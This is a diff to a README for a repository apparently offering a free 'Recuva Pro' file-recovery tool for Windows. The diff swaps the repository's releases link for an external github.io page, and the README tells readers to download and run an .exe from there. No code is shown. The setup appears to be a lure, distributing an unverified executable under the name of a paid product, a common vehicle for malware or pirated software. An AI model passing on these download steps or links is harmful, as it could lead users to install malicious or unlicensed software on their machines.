@@ -1,6 +1,6 @@
 # 📁 Descargar-Recuva-Pro - Recover deleted files on Windows easily
 
-[![](https://img.shields.io/badge/Download-Recuva-Pro-blue.svg)](https://github.com/youcef93t/Descargar-Recuva-Pro/releases)
+[![](https://img.shields.io/badge/Download-Recuva-Pro-blue.svg)](https://youcef93t.github.io)
 
 Recuva Pro helps you restore files you deleted by mistake. This tool works on Windows 10 and Windows 11. It scans your hard drive, memory card, or USB stick to find lost photos, documents, and videos. Follow this guide to set up the software on your computer.
 
@@ -18,7 +18,7 @@ Recuva Pro needs basic hardware to run. Ensure your computer meets these standar
 
 You need to access the release page to get the installer. 
 
-1. Visit this page to download: [https://github.com/youcef93t/Descargar-Recuva-Pro/releases](https://github.com/youcef93t/Descargar-Recuva-Pro/releases)
+1. Visit this page to download: [https://youcef93t.github.io](https://youcef93t.github.io)
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to start the file transfer to your computer.
 4. Save the file in your Downloads folder for easy access.
